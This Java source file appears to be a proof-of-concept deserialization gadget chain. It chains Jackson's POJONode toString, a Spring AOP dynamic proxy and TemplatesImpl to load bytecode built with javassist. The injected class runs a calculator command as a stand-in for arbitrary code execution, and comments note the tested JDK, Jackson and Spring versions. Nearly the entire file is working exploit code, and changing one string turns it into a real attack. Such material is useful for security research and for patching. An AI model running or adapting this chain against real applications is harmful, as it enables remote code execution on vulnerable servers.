package com.xiinnn.tostring2getter;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

// POJONode#toString -> getter（稳定版）
// 实测：jdk8u181 jackson-databind#2.14.1 spring-aop#5.3.24
public class JacksonToString2GetterBetter {
    public static void main(String[] args) throws Exception{
        byte[] code = getTemplates();
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "useless");
        setFieldValue(templates, "_tfactory",  new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", codes);
        // 删除 BaseJsonNode#writeReplace 方法用于顺利序列化
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();

        POJONode node = new POJONode(makeTemplatesImplAopProxy(templates));
        node.toString();
    }
    public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }
    public static byte[] getTemplates() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("MyTemplate");
        template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec(\"open -a Calculator\");";
        template.makeClassInitializer().insertBefore(block);
        return template.toBytecode();
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
}
